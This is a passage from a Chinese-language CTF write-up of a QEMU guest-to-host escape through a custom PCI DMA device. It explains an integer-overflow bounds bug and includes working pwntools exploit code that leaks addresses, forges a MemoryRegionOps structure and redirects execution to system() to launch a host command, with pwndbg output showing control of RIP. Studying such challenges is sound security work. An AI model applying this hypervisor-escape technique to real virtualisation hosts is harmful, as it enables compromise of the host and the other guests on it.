class="number">0x2021</span>;  <span class="comment">// 8225</span></span><br><span class="line">    k-&gt;device_id = <span class="number">0x0612</span>;  <span class="comment">// 1554</span></span><br><span class="line">    k-&gt;revision  = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id  = PCI_CLASS_OTHERS;</span><br><span class="line">    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo qwb_info = &#123;</span><br><span class="line">    .name          = TYPE_QWB,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(QWBState),</span><br><span class="line">    .instance_init = qwb_instance_init,</span><br><span class="line">    .class_init    = qwb_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    type_register_static(&amp;qwb_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type_init(qwb_register_types)</span><br></pre></td></tr></table></figure></div>

<p>这是一个<strong>简化的 DMA 控制器</strong>，挂在 PCI 上，暴露一个 1MiB 的 MMIO BAR。它内部有一块 4KB 的设备缓冲区 <code>dma_buf</code>，和最多 32 条 DMA 描述符 <code>dma_info[32]</code>。通过 MMIO 寄存器把描述符填好，再<strong>读</strong>一次 <code>BASE+0x30</code> 就会调用 <code>qwb_do_dma()</code> 执行 DMA。</p>
<p>我们对 MMIO 读写的偏移对应着下面几种功能：</p>
<table>
<thead>
<tr>
<th align="right">偏移</th>
<th>名称</th>
<th>访问</th>
<th>语义</th>
</tr>
</thead>
<tbody><tr>
<td align="right">0x00</td>
<td>SIZE</td>
<td>R&#x2F;W</td>
<td>队列长度（条目数），<code>0..32</code>。<strong>写时未检查 <code>dma_using</code>（漏洞之一）</strong>。读返回当前长度。</td>
</tr>
<tr>
<td align="right">0x08</td>
<td>IDX</td>
<td>R&#x2F;W</td>
<td>当前条目索引 <code>0..31</code>。<strong>仅在 <code>dma_using==0</code> 时可写&#x2F;可读</strong>；忙时读返回~0。</td>
</tr>
<tr>
<td align="right">0x10</td>
<td>SRC</td>
<td>R&#x2F;W</td>
<td>针对 <code>IDX</code> 指向条目。读&#x2F;写都要求 <code>!(dma_using)</code> 且 <code>IDX&lt;=31</code>（读里通过“拼字段”技巧实现）。</td>
</tr>
<tr>
<td align="right">0x18</td>
<td>DST</td>
<td>R&#x2F;W</td>
<td>同上。</td>
</tr>
<tr>
<td align="right">0x20</td>
<td>CNT</td>
<td>R&#x2F;W</td>
<td>同上。</td>
</tr>
<tr>
<td align="right">0x28</td>
<td>CMD</td>
<td>R&#x2F;W</td>
<td>只使用 bit0：<code>0=system→device</code>，<code>1=device→system</code>。</td>
</tr>
<tr>
<td align="right">0x30</td>
<td>START</td>
<td>R</td>
<td><strong>读触发</strong>。若 <code>!dma_using</code>，调用 <code>qwb_do_dma()</code> 执行前 <code>SIZE</code> 条，返回 <code>1</code>；否则返回 ~0。</td>
</tr>
</tbody></table>
<p>也就是先用其他功能号设置必要的字段，然后再通过 0x30 偏移的读操作来触发 <code>qwb_do_dma</code> 函数进行实际的读写操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd == <span class="number">1</span>: pci_dma_write(&amp;pdev, dst, &amp;dma_buf[src], cnt); <span class="comment">// device → system (写系统物理内存)</span></span><br><span class="line">cmd == <span class="number">0</span>: pci_dma_read (&amp;pdev, src, &amp;dma_buf[dst], cnt); <span class="comment">// system → device (读系统物理内存)</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>cmd==0</code>（guest→device）：从“来宾物理内存（guest RAM）”拷贝到<strong>设备内部</strong> <code>dma_buf[dst..dst+cnt)</code>;</li>
<li><code>cmd==1</code>（device→guest）：从设备内部 <code>dma_buf[src..src+cnt)</code> 拷贝到<strong>来宾物理内存</strong>（<code>dst</code>）。</li>
</ul>
<p>漏洞点位于 <code>qwb_do_dma()</code> 的第一段检查（只检查设备侧的 <code>dma_buf</code> 界限）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (d-&gt;cmd) &#123; <span class="comment">// device -&gt; system</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;src + d-&gt;cnt &gt; <span class="number">0x1000</span> || d-&gt;cnt &gt; <span class="number">0x1000</span>) <span class="keyword">goto</span> end;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;      <span class="comment">// system -&gt; device</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;dst + d-&gt;cnt &gt; <span class="number">0x1000</span> || d-&gt;cnt &gt; <span class="number">0x1000</span>) <span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的 <code>d-&gt;src + d-&gt;cnt</code> 与 <code>d-&gt;dst + d-&gt;cnt</code> 在 C 里是 <strong>无符号 64 位加法</strong>。若选择 <code>cnt</code> 为一个不大的值（<code>&lt;=0x1000</code> 以避开第二个条件），但让 <code>src</code> 或 <code>dst</code> 接近 <code>2^64</code>，则<strong>加法会回绕到很小</strong>，从而通过 <code>&lt;=0x1000</code> 的判断。</p>
<p>于是后续真实 DMA 阶段会把 <code>&amp;s-&gt;dma_buf[src]</code> 或 <code>&amp;s-&gt;dma_buf[dst]</code> 当作<strong>宿主进程地址空间中的指针</strong>继续使用，形成：</p>
<ul>
<li><code>cmd==1</code>：<strong>越界读宿主内存</strong>（<code>pci_dma_write(..., s-&gt;dma_buf + src, cnt)</code> 以该指针为源）；</li>
<li><code>cmd==0</code>：<strong>越界写宿主内存</strong>（<code>pci_dma_read(..., s-&gt;dma_buf + dst, cnt)</code> 为目的）。</li>
</ul>
<p>也就是说我们可以从 <code>dma_buf</code> 往前最多 0x1000 长度越界读写，最大读写长度是 0x1000，并且读写区间的末尾必须落到 <code>dma_buf</code> 范围。</p>
<h2 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>观察 <code>dma_buf</code> 所在的 <code>QWBState</code> 结构体：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QWBState</span> &#123;</span></span><br><span class="line">    PCIDevice   pdev;              <span class="comment">// 0x000 ~ 0x8ff</span></span><br><span class="line">    MemoryRegion mmio;             <span class="comment">// 0x900 ~ 0x9ef</span></span><br><span class="line">    <span class="type">uint32_t</span>    dma_info_size;     <span class="comment">// 0x9f0</span></span><br><span class="line">    <span class="type">uint32_t</span>    dma_info_idx;      <span class="comment">// 0x9f4</span></span><br><span class="line">    <span class="type">uint32_t</span>    dma_using;         <span class="comment">// 0x9f8</span></span><br><span class="line">    <span class="type">uint32_t</span>    _pad;              <span class="comment">// 0x9fc</span></span><br><span class="line">    dma_state   dma_info[<span class="number">32</span>];      <span class="comment">// 0xa00 ~ 0xdff</span></span><br><span class="line">    <span class="type">uint8_t</span>     dma_buf[<span class="number">0x1000</span>];   <span class="comment">// 0xe00 ~ 0x1dff</span></span><br><span class="line">&#125; QWBState;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>dma_buf</code> 越界读写范围内有一个 <code>MemoryRegion</code> 结构体 <code>mmio</code>，这个结构体在 <code>qwb_realize</code> 注册 MMIO 内存的时候被初始化。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qwb_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    QWBState *s = QWB(pdev);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mmio, OBJECT(pdev), &amp;qwb_mmio_ops, s, <span class="string">&quot;qwb-mmio&quot;</span>, <span class="number">0x100000</span>);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;mmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>MemoryRegion</code> 结构体定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops; <span class="comment">// 👈 劫持程序执行流</span></span><br><span class="line">    <span class="type">void</span> *opaque; <span class="comment">// 👈 泄露 QWBState 地址</span></span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    Int128 size;</span><br><span class="line">    hwaddr addr;</span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr); <span class="comment">// 👈 泄露 qemu 基地址</span></span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;</span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>我们可以从这个区域内泄露 <code>QWBState</code> 地址和 QEMU 程序基地址。</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>telescope 0x55b9e81feee0+0xe00-0x4b8
00:0000│  <font color="#3465A4">0x55b9e81ff828</font> —▸ 0x55b9cbc6ed80 (qwb_mmio_ops) —▸ <font color="#CC0000">0x55b9cb03ffa5 (qwb_mmio_read)</font> ◂— <font color="#AFD700">endbr64</font><font color="#EEEEEC"> </font>
01:0008│  <font color="#3465A4">0x55b9e81ff830</font> —▸ <font color="#3465A4">0x55b9e81feee0</font> —▸ <font color="#3465A4">0x55b9e7571790</font> —▸ <font color="#3465A4">0x55b9e736bb00</font> —▸ <font color="#3465A4">0x55b9e7304f00</font> ◂— ...
02:0010│  <font color="#3465A4">0x55b9e81ff838</font> —▸ <font color="#3465A4">0x55b9e75e6400</font> —▸ <font color="#3465A4">0x55b9e744b4a0</font> —▸ <font color="#3465A4">0x55b9e73aa140</font> —▸ <font color="#3465A4">0x55b9e73aa2c0</font> ◂— ...
03:0018│  <font color="#3465A4">0x55b9e81ff840</font> ◂— 0x100000
04:0020│  <font color="#3465A4">0x55b9e81ff848</font> ◂— 0
05:0028│  <font color="#3465A4">0x55b9e81ff850</font> ◂— 0xf0000000
06:0030│  <font color="#3465A4">0x55b9e81ff858</font> —▸ <font color="#CC0000">0x55b9cb3c5631 (memory_region_destructor_none)</font> ◂— <font color="#AFD700">endbr64</font><font color="#EEEEEC"> </font>
07:0038│  <font color="#3465A4">0x55b9e81ff860</font> ◂— 0
</pre>


<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qt = QTest([<span class="string">&quot;./launch.sh&quot;</span>])</span><br><span class="line">qwb = QWB(qt, base=<span class="number">0xf0000000</span>)</span><br><span class="line"></span><br><span class="line">qemu = ELF(<span class="string">&quot;./qemu-system-x86_64&quot;</span>)</span><br><span class="line">leak = qwb.oob_read_before(neg_off=<span class="number">0x4b8</span>, nbytes=<span class="number">0x600</span>, ram_out=<span class="number">0x300000</span>)</span><br><span class="line"><span class="built_in">print</span>(hexdump(leak))</span><br><span class="line">QWBState_addr = u64(leak[<span class="number">0x8</span>:<span class="number">0x8</span> + <span class="number">8</span>])</span><br><span class="line">success(<span class="string">&quot;QWBState_addr: &quot;</span> + <span class="built_in">hex</span>(QWBState_addr))</span><br><span class="line">qemu.address = u64(leak[<span class="number">0x30</span>:<span class="number">0x30</span> + <span class="number">8</span>]) - qemu.sym[<span class="string">&#x27;memory_region_destructor_none&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;qemu base: &quot;</span> + <span class="built_in">hex</span>(qemu.address))</span><br></pre></td></tr></table></figure></div>

<p><code>MemoryRegionOps</code> 中的 <code>read</code> 和 <code>write</code> 回调函数用来处理针对这块 IO 映射内存的操作：</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>p qwb_mmio_ops
&dollar;2 = {
  read = <font color="#3465A4">0x55b9cb03ffa5</font> &lt;<font color="#C4A000">qwb_mmio_read</font>&gt;,
  write = <font color="#3465A4">0x55b9cb0401bd</font> &lt;<font color="#C4A000">qwb_mmio_write</font>&gt;,
  read_with_attrs = <font color="#3465A4">0x0</font>,
  write_with_attrs = <font color="#3465A4">0x0</font>,
  endianness = DEVICE_NATIVE_ENDIAN,
  valid = {
    min_access_size = 4,
    max_access_size = 8,
    unaligned = false,
    accepts = <font color="#3465A4">0x0</font>
  },
  impl = {
    min_access_size = 4,
    max_access_size = 8,
    unaligned = false
  }
}
</pre>

<p>我们可以劫持这个 <code>ops</code> 指针指向可控内存，然后在这块内存中伪造一个 <code>MemoryRegionOps</code> 结构从而劫持程序执行流程：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">leak = <span class="built_in">bytearray</span>(leak)</span><br><span class="line"></span><br><span class="line">leak[<span class="number">0</span>:<span class="number">8</span>] = p64(QWBState_addr + <span class="number">0xE00</span>)</span><br><span class="line">qwb_mmio_ops = flat(</span><br><span class="line">    <span class="comment"># function pointers (8 bytes each)</span></span><br><span class="line">    p64(<span class="number">0xdeadbeef</span>),  <span class="comment"># read</span></span><br><span class="line">    p64(<span class="number">0xdeadbeef</span>),  <span class="comment"># write</span></span><br><span class="line">    p64(<span class="number">0</span>),  <span class="comment"># read_with_attrs (NULL)</span></span><br><span class="line">    p64(<span class="number">0</span>),  <span class="comment"># write_with_attrs (NULL)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># endianness (assume 4 bytes) + 4 bytes padding to keep 8-byte alignment</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># endianness (uint32)</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># padding</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># valid sub-struct (assume fields are 32-bit then a pointer)</span></span><br><span class="line">    p32(<span class="number">4</span>),  <span class="comment"># valid.min_access_size = 4</span></span><br><span class="line">    p32(<span class="number">8</span>),  <span class="comment"># valid.max_access_size = 8</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># valid.unaligned = false (0)</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># padding to align the next pointer</span></span><br><span class="line">    p64(<span class="number">0</span>),  <span class="comment"># valid.accepts = 0 (NULL / placeholder)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># impl sub-struct (assume 3 x 32-bit fields; pad to 8-byte boundary)</span></span><br><span class="line">    p32(<span class="number">4</span>),  <span class="comment"># impl.min_access_size = 4</span></span><br><span class="line">    p32(<span class="number">8</span>),  <span class="comment"># impl.max_access_size = 8</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># impl.unaligned = false</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># padding</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">leak[<span class="number">0x4b8</span>:<span class="number">0x4b8</span> + <span class="built_in">len</span>(qwb_mmio_ops)] = qwb_mmio_ops</span><br><span class="line">leak[<span class="number">0x8</span>:<span class="number">0x8</span> + <span class="number">8</span>] = <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> <span class="comment"># rdi -&gt; opaque</span></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">bytes</span>(leak)</span><br><span class="line"></span><br><span class="line">qwb.oob_write_before(neg_off=<span class="number">0x4b8</span>, payload=leak)</span><br><span class="line">pause()</span><br><span class="line">qwb.oob_write_before(neg_off=<span class="number">0x4b0</span>, payload=leak)</span><br></pre></td></tr></table></figure></div>

<p>下一次读写这块内存时成功劫持程序执行流程，并且 <code>rax</code> 和 <code>rdi</code> 寄存器是可控的。</p>
<pre>LEGEND: <font color="#C4A000">STACK</font> | <font color="#3465A4">HEAP</font> | <font color="#CC0000">CODE</font> | <font color="#75507B">DATA</font> | <font color="#CC0000"><u style="text-decoration-style:single">WX</u></font> | RODATA
<font color="#3465A4">───────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────</font>
<font color="#CC0000">*</font><font color="#CC0000"><b>RAX </b></font> 0x4242424242424242 (&apos;BBBBBBBB&apos;)
 <b>RBX </b> <font color="#3465A4">0x55b7228da8c0</font> ◂— 1
 <b>RCX </b> 8
 <b>RDX </b> 1
<font color="#CC0000">*</font><font color="#CC0000"><b>RDI </b></font> 0x4242424242424242 (&apos;BBBBBBBB&apos;)
 <b>RSI </b> 0
<font color="#CC0000">*</font><font color="#CC0000"><b>R8  </b></font> 0xdeadbeef
 <b>R9  </b> 0xffffffffffffffff
 <b>R10 </b> <font color="#CC0000">0x55b6fe0c0109 (memory_region_write_accessor)</font> ◂— <font color="#AFD700">endbr64</font><font color="#EEEEEC"> </font>
 <b>R11 </b> 0x7f0ed00dc3c0 ◂— 0x2000200020002
 <b>R12 </b> <font color="#3465A4">0x55b721e13110</font> ◂— 0x55b700000002
 <b>R13 </b> <font color="#CC0000">0x55b6fe1e3238 (qio_channel_fd_source_dispatch)</font> ◂— <font color="#AFD700">endbr64</font><font color="#EEEEEC"> </font>
 <b>R14 </b> <font color="#75507B">0x7f0ed102f280</font> —▸ <font color="#CC0000">0x7f0ed0f54e80</font> ◂— <font color="#AFD700">endbr64</font><font color="#EEEEEC"> </font>
 <b>R15 </b> <font color="#3465A4">0x55b7228da9b0</font> —▸ <font color="#3465A4">0x55b721e13110</font> ◂— 0x55b700000002
 <b>RBP </b> <font color="#C4A000">0x7ffe36ce3120</font> —▸ <font color="#C4A000">0x7ffe36ce31a0</font> —▸ <font color="#C4A000">0x7ffe36ce31f0</font> —▸ <font color="#C4A000">0x7ffe36ce3250</font> —▸ <font color="#C4A000">0x7ffe36ce32d0</font> ◂— ...
 <b>RSP </b> <font color="#C4A000">0x7ffe36ce30d8</font> —▸ <font color="#CC0000">0x55b6fe0c01f6 (memory_region_write_accessor+237)</font> ◂— <font color="#AFD700">mov</font><font color="#EEEEEC"> </font><font color="#5FD7FF">eax</font><font color="#EEEEEC">, </font><font color="#AF87FF">0</font>
<font color="#CC0000">*</font><font color="#CC0000"><b>RIP </b></font> 0xdeadbeef
<font color="#3465A4">────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────</font>
<font color="#CC0000">Invalid address 0xdeadbeef</font>











<font color="#3465A4">──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────</font>
00:0000│ <b>rsp</b> <font color="#C4A000">0x7ffe36ce30d8</font> —▸ <font color="#CC0000">0x55b6fe0c01f6 (memory_region_write_accessor+237)</font> ◂— <font color="#AFD700">mov</font><font color="#EEEEEC"> </font><font color="#5FD7FF">eax</font><font color="#EEEEEC">, </font><font color="#AF87FF">0</font>
01:0008│-040 <font color="#C4A000">0x7ffe36ce30e0</font> —▸ <font color="#3465A4">0x55b7219bc080</font> ◂— 0x302e37312b20525b (&apos;[R +17.0&apos;)
02:0010│-038 <font color="#C4A000">0x7ffe36ce30e8</font> ◂— 0xffffffffffffffff
03:0018│-030 <font color="#C4A000">0x7ffe36ce30f0</font> ◂— 0x800000000
04:0020│-028 <font color="#C4A000">0x7ffe36ce30f8</font> —▸ <font color="#C4A000">0x7ffe36ce31c8</font> ◂— 1
05:0028│-020 <font color="#C4A000">0x7ffe36ce3100</font> ◂— 0
06:0030│-018 <font color="#C4A000">0x7ffe36ce3108</font> —▸ <font color="#3465A4">0x55b7227f47e0</font> —▸ <font color="#3465A4">0x55b721a404a0</font> —▸ <font color="#3465A4">0x55b72199f140</font> —▸ <font color="#3465A4">0x55b72199f2c0</font> ◂— ...
07:0038│-010 <font color="#C4A000">0x7ffe36ce3110</font> ◂— 1
<font color="#3465A4">────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────</font>
 ► 0       0xdeadbeef
   1   0x55b6fe0c01f6 memory_region_write_accessor+237
   2   0x55b6fe0c042d access_with_adjusted_size+317
   3   0x55b6fe0c34dc memory_region_dispatch_write+269
   4   0x55b6fe153163 flatview_write_continue+197
   5   0x55b6fe1532ac flatview_write+140
   6   0x55b6fe153626 address_space_write+115
   7   0x55b6fe061fd4 qtest_process_command+3455
<font color="#3465A4">────────────────────────────────────────────────────────[ THREADS (3 TOTAL) ]────────────────────────────────────────────────────────</font>
  ► 1	&quot;<font color="#06989A">qemu-system-x86</font>&quot; <font color="#C4A000">stopped</font>: 0xdeadbeef
    2	&quot;<font color="#06989A">qemu-system-x86</font>&quot; <font color="#C4A000">stopped</font>: <font color="#CC0000">0x7f0ed005889d</font> &lt;<font color="#4E9A06"><b>syscall+29</b></font>&gt; 
    3	&quot;<font color="#06989A">qemu-system-x86</font>&quot; <font color="#C4A000">stopped</font>: <font color="#CC0000">0x7f0ecff84322</font> &lt;<font color="#4E9A06"><b>sigtimedwait+162</b></font>&gt; 
<font color="#3465A4">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</font>
<font color="#4E9A06"><b>pwndbg&gt; </b></font>
</pre>

<p>至此我们的利用思路就很多了，比如让 <code>rdi</code> 指向要执行的命令，然后跳转到 <code>system@plt</code> 执行命令。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">leak = <span class="built_in">bytearray</span>(leak)</span><br><span class="line"></span><br><span class="line">leak[<span class="number">0</span>:<span class="number">8</span>] = p64(QWBState_addr + <span class="number">0xe00</span>)</span><br><span class="line">qwb_mmio_ops = flat(</span><br><span class="line">    <span class="comment"># function pointers (8 bytes each)</span></span><br><span class="line">    p64(qemu.plt[<span class="string">&#x27;system&#x27;</span>]),  <span class="comment"># read</span></span><br><span class="line">    p64(qemu.plt[<span class="string">&#x27;system&#x27;</span>]),  <span class="comment"># write</span></span><br><span class="line">    p64(<span class="number">0</span>),  <span class="comment"># read_with_attrs (NULL)</span></span><br><span class="line">    p64(<span class="number">0</span>),  <span class="comment"># write_with_attrs (NULL)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># endianness (assume 4 bytes) + 4 bytes padding to keep 8-byte alignment</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># endianness (uint32)</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># padding</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># valid sub-struct (assume fields are 32-bit then a pointer)</span></span><br><span class="line">    p32(<span class="number">4</span>),  <span class="comment"># valid.min_access_size = 4</span></span><br><span class="line">    p32(<span class="number">8</span>),  <span class="comment"># valid.max_access_size = 8</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># valid.unaligned = false (0)</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># padding to align the next pointer</span></span><br><span class="line">    p64(<span class="number">0</span>),  <span class="comment"># valid.accepts = 0 (NULL / placeholder)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># impl sub-struct (assume 3 x 32-bit fields; pad to 8-byte boundary)</span></span><br><span class="line">    p32(<span class="number">4</span>),  <span class="comment"># impl.min_access_size = 4</span></span><br><span class="line">    p32(<span class="number">8</span>),  <span class="comment"># impl.max_access_size = 8</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># impl.unaligned = false</span></span><br><span class="line">    p32(<span class="number">0</span>),  <span class="comment"># padding</span></span><br><span class="line">)</span><br><span class="line">cmd = <span class="string">&quot;/usr/bin/gnome-calculator&quot;</span></span><br><span class="line"></span><br><span class="line">leak[<span class="number">0x4b8</span>:<span class="number">0x4b8</span> + <span class="built_in">len</span>(qwb_mmio_ops)] = qwb_mmio_ops</span><br><span class="line">leak[<span class="number">0x4b8</span> + <span class="built_in">len</span>(qwb_mmio_ops):<span class="number">0x4b8</span> + <span class="built_in">len</span>(qwb_mmio_ops) + <span class="built_in">len</span>(cmd)] = cmd.encode()</span><br><span class="line">leak[<span class="number">0x8</span>:<span class="number">0x8</span> + <span class="number">8</span>] = p64(QWBState_addr + <span class="number">0xe00</span> + <span class="built_in">len</span>(qwb_mmio_ops))</span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">bytes</span>(leak)</span><br><span class="line"></span><br><span class="line">qwb.oob_write_before(neg_off=<span class="number">0x4b8</span>, payload=leak)</span><br><span class="line">pause()</span><br><span class="line">qwb.oob_write_before(neg_off=<span 